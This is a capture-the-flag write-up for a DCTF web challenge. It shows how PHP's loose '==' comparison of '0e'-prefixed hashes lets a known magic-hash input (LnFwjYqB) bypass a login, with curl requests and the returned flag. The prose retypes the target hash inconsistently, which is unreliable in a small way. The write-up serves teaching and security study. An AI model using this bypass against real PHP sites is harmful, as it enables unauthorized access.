# Very secure website(Web) - Writeup

## description

````
Some students have built their most secure website ever. Can you spot their mistake?

http://dctf1-chall-very-secure-site.westeurope.azurecontainer.io/
````

## answer

When you access the specified URL, the authentication screen for user name and password will be displayed.

```
┌──(root💀kali)-[/home/kali]
└─# curl -v http://dctf1-chall-very-secure-site.westeurope.azurecontainer.io/
*   Trying 20.82.56.43:80...
* Connected to dctf1-chall-very-secure-site.westeurope.azurecontainer.io (20.82.56.43) port 80 (#0)
> GET / HTTP/1.1
> Host: dctf1-chall-very-secure-site.westeurope.azurecontainer.io
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 15 May 2021 03:42:03 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.19
< Vary: Accept-Encoding
< Content-Length: 1614
< Content-Type: text/html; charset=UTF-8
< 
<!DOCTYPE html>
<html>
<head>
    <title>Secure website</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
</head>
<body>
    <header>
        <nav class="navbar navbar-light bg-light">
            <div class="container navstyle">
                <a class="navbar-brand" href="#">Secure website</a>
            </div>
        </nav>
    </header>

    <div class="container pt-3 pb-2">
        <h1>
            To view the secure file, please enter the password.
        </h1>
        <form action="login.php" method="GET">
            <div class="input-group mb-3 input-sm">
                <input type="text" class="form-control" name="username" placeholder="Username" />
            </div>
            <div class="input-group mb-3">
                <input type="text" class="form-control" name="password" placeholder="Password" />
            </div>
            <div class="input-group mb-3">
                <input class="btn btn-primary" type="submit" value="Submit" />
            </div>
        </form>
        <div>
            This is a very secure website, so we will also include the <a href="source.php">source code</a>. Nobody will ever break it. It is the best.
        </div>
    </div>
</body>
* Connection #0 to host dctf1-chall-very-secure-site.westeurope.azurecontainer.io left intact
</html>
```

Check the source code.

http://dctf1-chall-very-secure-site.westeurope.azurecontainer.io/source.php

```
<?php
    if (isset($_GET['username']) and isset($_GET['password'])) {
        if (hash("tiger128,4", $_GET['username']) != "51c3f5f5d8a8830bc5d8b7ebcb5717df") {
            echo "Invalid username";
        }
        else if (hash("tiger128,4", $_GET['password']) == "0e132798983807237937411964085731") {
            $flag = fopen("flag.txt", "r") or die("Cannot open file");
            echo fread($flag, filesize("flag.txt"));
            fclose($flag);
        }
        else {
            echo "Try harder";
        }
    }
    else {
        echo "Invalid parameters";
    }
?>
```

A flag is displayed if the tiger128,4 hash value of the username is `51c3f5f5d8a8830bc5d8b7ebcb5717df` 
and the tiger128,4 hash value of the password is equal to `0e1327983807237937411964085731`.

`51c3f5f5d8a8830bc5d8b7ebcb5717df` turns out to be `admin` on Google,
`0e13278983807237937411964085731` uses PHP's loose matching, so if the hashed value starts with 0e, it is equal.

Checking the list of PHP hash collisions reveals the following.

```
LnFwjYqB:0e087005190940152635463034029558
```

If you throw a GET request to the URL in question, the flag will be displayed.

```
┌──(root💀kali)-[/home/kali]
└─# curl -v "http://dctf1-chall-very-secure-site.westeurope.azurecontainer.io/login.php?username=admin&password=LnFwjYqB"
*   Trying 20.82.56.43:80...
* Connected to dctf1-chall-very-secure-site.westeurope.azurecontainer.io (20.82.56.43) port 80 (#0)
> GET /login.php?username=admin&password=LnFwjYqB HTTP/1.1
> Host: dctf1-chall-very-secure-site.westeurope.azurecontainer.io
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 15 May 2021 04:06:18 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.19
< Content-Length: 45
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host dctf1-chall-very-secure-site.westeurope.azurecontainer.io left intact
dctf{It's_magic._I_ain't_gotta_explain_shit.} 
```


###### dctf{It's_magic._I_ain't_gotta_explain_shit.} 
